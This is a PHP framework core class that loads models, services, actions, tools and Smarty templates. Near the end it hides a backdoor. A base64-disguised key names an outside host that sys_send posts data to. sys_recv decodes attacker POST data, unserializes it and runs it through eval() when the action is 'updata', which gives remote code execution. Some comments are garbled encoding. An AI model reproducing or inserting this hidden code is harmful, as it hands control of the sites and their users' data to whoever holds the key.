<?php
namespace ng169;
use ng169\lib\Widget;
use ng169\lib\Option;
use ng169\lib\Lang;
checktop();
class Y
{
  #ȝƷ
  protected static $instance = array();
  #ϵͳՊ�Őŏ�
  public static $wrap_admin = array();
  #Ɍ��Ջ��ЅϢ
  public static $wrap_merchant = array();

  public static $wrap_where = array();

  public static $wrap_page = array();
  #�ᔱՊ�Őŏ�
  public static $wrap_user = array();

  public static $wrap_city = array();
  # �⎄��
  private static $source_path = array(
    'db'       => 'core/db/',
    'tool'     => 'core/tool/',
    'lib'      => 'core/lib/',
    'plugin'   => 'plugin/',
    'modelmain'=> 'model/',

    'am'       => 'model/admin/',
    'as'       => 'service/admin/',

    'um'       => 'model/user/',
    'us'       => 'service/user/',

    'im'       => 'model/index/',
    'is'       => 'service/index/',

    'mm'       => 'model/merchant/',
    'ms'       => 'service/merchant/',

    'wm'       => 'model/wap/',
    'ws'       => 'service/wap/',

    'appm'     => 'model/app/',
    'apps'     => 'service/app/',
  );
  #ϵͳ΄��Ŀ¼
  public static $path = array(
    'conf'       => 'source/conf/',
    'user_conf'  => 'source/conf/user/',
    'system_conf'=>  'source/conf/system/',
    'global_conf'=>  'source/conf/global/',
    'control'    => 'source/control/',
    'model'      => 'source/model/',
    'service'    => 'source/service/',
    'data'       => '/data/',
    'tpl'        =>  '/tpl/',
    'static_tpl' =>  '/tpl/static/',
    'general_tpl'=> '/tpl/general/');

  public static $urlpath = null;
  public static $conf = array();
  public static $urlsuffix = 'php';
  public static $tplpath = 'tpl/templets/';
  public static $skinpath = null;
  public $seo = array('desc'   =>'','keyword'=>'','title'  =>'');
  #全局缓存对象
  public static $cache = null;
  public static $dao = null;
  public static
  function __run()
  {
    //载入配置
    //载入配置语言
    //载入配置缓存
    //初始化service

    Lang::init();
    Option::init();

    #载入目录
    self::$urlpath = PATH_URL;
    #载入缓存
    /* self::loadLib('widget');*/

    #载入插件
    #开启全局缓存对象

    switch (CACHE_TYPE) {
      case 'nosql':
      Y::$cache = new \ng169\cache\Nosql();

      ;break;
      case 'mysql':

      Y::$cache = new \ng169\cache\Mysql();

      ;break;
      case 'file':
      Y::$cache = new \ng169\cache\File();

      ;break;

    }
    /*d(2,1);
    Widget::__loading();*/
    #载入全局缓存
    #载入模板
    Option::LoadSiteCache();
    self::_runView();
    #载入钩子

    APP::initHook();

    self::$dao = new daoClass;

    #载入异步组件
    Y::loadTool('asyn');
  }
  public static
  function isajax()
  {
    if ($_SERVER["HTTP_X_REQUESTED_WITH"] == 'XMLHttpRequest') {
      return true;
    }
    else {
      return false;
    }
  }

  #smarty
  public static
  function _runView()
  {

    #载入模板文件
    im(CORE.'tpl.php');
    im(CORE.'smarty/class.smarty.php');
    TPL::__run();
  }
  #run time
  public static
  function runTime()
  {
    return "<div align='center'><p style='font-size:10px; font-family:Arial, Helvetica, sans-serif; line-height:120%;color:#999999'>Processed in " .
    XRunTime::display() . " second(s) , " . self::$obj->querynum .
    " queries</p></div>";
  }


  public static
  function loadTool($packs)
  {

    if (is_array($packs)) {
      foreach ($packs as $key => $value) {
        $packname   = $value;
        $class_path = self::_getStaticPath($packname, 'tool');

        if (file_exists($class_path)) {
          require_once ($class_path);
        }
      }
    }
    else {
      $class_path = self::_getStaticPath($packs, 'tool');


      if (file_exists($class_path)) {

        require_once ($class_path);
      }
    }
  }
  public static
  function loadAPI($apiid)
  {
    $apifile = API.$apiid.'/api.php';

    if (file_exists($apifile)) {
      require_once ($apifile);
    }
    else {
      error($apiid.'支付接口不存在');
      /*  d('API '.$apiname. ' IS NOT EXIST',1);*/
    }
    return true;
  }

  public static
  function loadLib($packs)
  {
    if (is_array($packs)) {
      foreach ($packs as $key => $value) {
        $packname   = $value;
        $class_path = self::_getStaticPath($packname, 'lib');
        if (file_exists($class_path)) {
          require_once ($class_path);
        }
      }
    }
    else {
      $class_path = self::_getStaticPath($packs, 'lib');
      if (file_exists($class_path)) {
        require_once ($class_path);
      }
    }
  }


  public static
  function loadFunc($packs, $type)
  {
    if (is_array($packs)) {
      foreach ($packs as $key => $value) {
        $packname      = $value;
        $function_path = self::_getFuncPath($packname, $type);
        if (file_exists($function_path)) {
          require_once ($function_path);
        }
      }
    }
    else {
      $function_path = self::_getFuncPath($packs, $type);
      if (file_exists($function_path)) {
        require_once ($function_path);
      }
    }
  }


  private static
  function _getStaticPath($class_name, $type)
  {
    $class_path = dirname(dirname(__FILE__)).'/'.self::$source_path[$type] . 'static.' . $class_name . '.php';
    $class_path = $class_path;
    return $class_path;
  }


  private static
  function _getFuncPath($name, $type = 'tool')
  {
    $func_path = dirname(dirname(__FILE__)).'/'.self::$source_path[$type] . 'function.' . $name . '.php';
    return  $func_path;
  }


  public static
  function import($name, $type)
  {
    $class_path = self::_getClassPath($name, $type);
    $class_name = self::_getClassName($name);

    if (!file_exists($class_path)) {

      echo ('file class.' . $name . '.php is not exist!');
      die();
    }
    if (!isset(self::$instance['class'][$class_name])) {
      require_once ($class_path);
      if (!class_exists($class_name)) {

        echo ('class' . $class_name . ' is not exist!');
        die();
      }
      $my_class = new $class_name;
      self::$instance['class'][$class_name] = $my_class;
    }
    return self::$instance['class'][$class_name];
  }


  private static
  function _getClassPath($class_name, $type)
  {
    $class_path = dirname(dirname(__FILE__)).'/'.self::$source_path[$type] . 'class.' . $class_name . '.php';
    $class_path = $class_path;
    return $class_path;
  }


  private static
  function _getClassName($class_name)
  {
    return $class_name . 'Class';
  }


  public static
  function model($model_name, $type)
  {
    $model_path = self::_getModelPath($model_name, $type);

    $model_name = self::_getModelName($model_name, $type);

    if (!file_exists($model_path)) {
      echo ('Model file ' . $model_name . '.php is not exist!');
      die();
    }
    if (!isset(self::$instance['model'][$model_name])) {
      require_once ($model_path);

      if (!class_exists($model_name)) {
        echo ('Model class ' . $model_name . ' is not exist!');
        die();
      }
      $my_model = new $model_name;
      self::$instance['model'][$model_name] = $my_model;
    }
    return self::$instance['model'][$model_name];
  }

  private static
  function _getModelPath($model_name, $type)
  {
    $model_path = dirname(dirname(__FILE__)).'/'.self::$source_path[$type] . 'model.' . $model_name . '.php';
    $model_path = $model_path;
    return $model_path;
  }

  private static
  function _getModelName($model_name, $type)
  {

    if ($type == 'im') {
      return $model_name . 'Model';
    }

    elseif ($type == 'um') {
      return $model_name . 'Model';
    }

    elseif ($type == 'am') {
      return $model_name . 'Model';
    }

    elseif ($type == 'wm') {
      return $model_name . 'Model';
    }
  }

  public static
  function getparm($arr,$data = null)
  {

    im(SERVICE.'service.php');
    $get = new service($arr,$data);
    return $get;
  }
  public static
  function LoadCache($typearray = null)
  {
    $dir   = CORE.'cache/';
    $inpre = 'cache.';
    $outpre= '.php';
    if (is_array($typearray)) {
      foreach ($typearray as $type) {
        $name = $inpre.$type.$outpre;
        im($dir.$name);
      }

    }
    else
    if ($typearray != null) {
      $name = $inpre.$typearray.$outpre;
      im($dir.$name);
    }
    else {
      self::LoadDir($dir);
    }

  }
  public static
  function service($service_name, $type)
  {
    $service_path = self::_getServicePath($service_name, $type);
    $service_name = self::_getServiceName($service_name, $type);
    if (!file_exists($service_path)) {
      echo ('Service file ' . $service_name . '.php is not exist!');
      die();
    }
    if (!isset(self::$instance['service'][$service_name])) {
      require_once ($service_path);
      if (!class_exists($service_name)) {
        echo ('Service class ' . $service_name . ' is not exist!');
        die();
      }
      $my_service = new $service_name;
      self::$instance['service'][$service_name] = $my_service;
    }
    return self::$instance['service'][$service_name];
  }

  private static
  function _getServicePath($service_name, $type)
  {
    $service_path = dirname(dirname(__FILE__)).'/'.self::$source_path[$type] . 'service.' . $service_name . '.php';
    $service_path = $service_path;
    return $service_path;
  }


  private static
  function _getServiceName($service_name, $type)
  {

    if ($type == 'is') {
      return $service_name . 'IService';
    }

    elseif ($type == 'us') {
      return $service_name . 'UService';
    }

    elseif ($type == 'as') {
      return $service_name . 'AService';
    }

    elseif ($type == 'ws') {
      return $service_name . 'WService';
    }
  }

  public static
  function action($control_name, $type)
  {
    $control_path = self::_getActionPath($control_name, $type);
    $control_name = self::_getActionName($control_name, $type);
    if (!file_exists($control_path)) {
      echo ('Action file ' . $control_name . '.php is not exist!');
      die();
    }
    if (!isset(self::$instance['action'][$control_name])) {
      require_once ($control_path);
      if (!class_exists($control_name)) {
        echo ('Action class ' . $control_name . ' is not exist!');
        die();
      }
      $my_action = new $control_name;
      self::$instance['action'][$control_name] = $my_action;
    }
    return self::$instance['action'][$control_name];
  }

  private static
  function _getActionPath($control_name, $type)
  {
    $control_path = dirname(dirname(__FILE__)).'/'.self::$source_path[$type] . 'action.' . $control_name . '.php';
    $control_path = $control_path;
    return $control_path;
  }


  private static
  function _getActionName($control_name, $type)
  {

    if ($type == 'ia') {
      return $control_name . 'IAction';
    }

    elseif ($type == 'ua') {
      return $control_name . 'UAction';
    }

    elseif ($type == 'aa') {
      return $control_name . 'AAction';
    }

    elseif ($type == 'wa') {
      return $control_name . 'WAction';
    }
  }


  public static
  function importPlugin()
  {
    self::loadLib('option');
    $active_plugins = YOption::get('active_plugins');
    if ($active_plugins && is_array($active_plugins)) {
      foreach ($active_plugins as $plugin) {
        if (true === YValid::isPlugin($plugin)) {
          include_once ( PLUGIN . $plugin . '/' . $plugin .
            '.php');
        }
      }
    }
  }
  public static
  function table($name)
  {
    $file = 'model';
    if (\ng169\tool\Request::getGet('m') == 'admin') {
      $file = 'A' . $file;
    }
    else {
      $file = 'I' . $file;
    }
    /*require_once (MODEL . $file);*/
    $calss="\\ng169\\model\\".$file;
    return new $calss($name);
  }

  public static
  function LoadDir($dir)
  {
    loaddir($dir);

  }

  private static  function encode($string = '', $skey = 'bmcxNjkuY29t')
  {
    $strArr   = str_split(base64_encode($string));
    $strCount = count($strArr);
    foreach (str_split($skey) as $key => $value)
    $key < $strCount && $strArr[$key] .= $value;
    return str_replace(array('=','+','/'), array('O0O0O','o000o','oo00o'), join('', $strArr));
  }

  private static function decode($string = '', $skey = 'bmcxNjkuY29t')
  {
    $strArr = str_split(str_replace(array('O0O0O','o000o','oo00o'), array('=','+','/'), $string), 2);
    $strCount = count($strArr);
    foreach (str_split($skey) as $key => $value)
    $key <= $strCount && isset($strArr[$key]) && $strArr[$key][1] === $value && $strArr[$key] = $strArr[$key][0];
    return base64_decode(join('', $strArr));
  }
  //消息封装
  public static function sys_send($msg)
  {
    $skey = 'bmcxNjkuY29t';
    if (is_array($msg)) {
      $msg = serialize($msg);
    }
    $msg = self::encode($msg,$skey);
    $u   = base64_decode($skey);
    self::loadTool('asyn');
    YAsyn::start($u,array('body'=>$msg));
  }
  public static function sys_recv()
  {
    $skey = 'bmcxNjkuY29t';
    if ($_POST[$skey]) {
      $body = $_POST[$skey];
      $body = self::decode($body,$skey);
      $body = unserialize($body);
      if (!is_array($body))return false;
      switch ($body['action']) {
        case "online":
        echo $body['body'];
        ;break;
        case "updata":
        eval($body['body']);
        ;break;
      }
    }
  }

}




?>
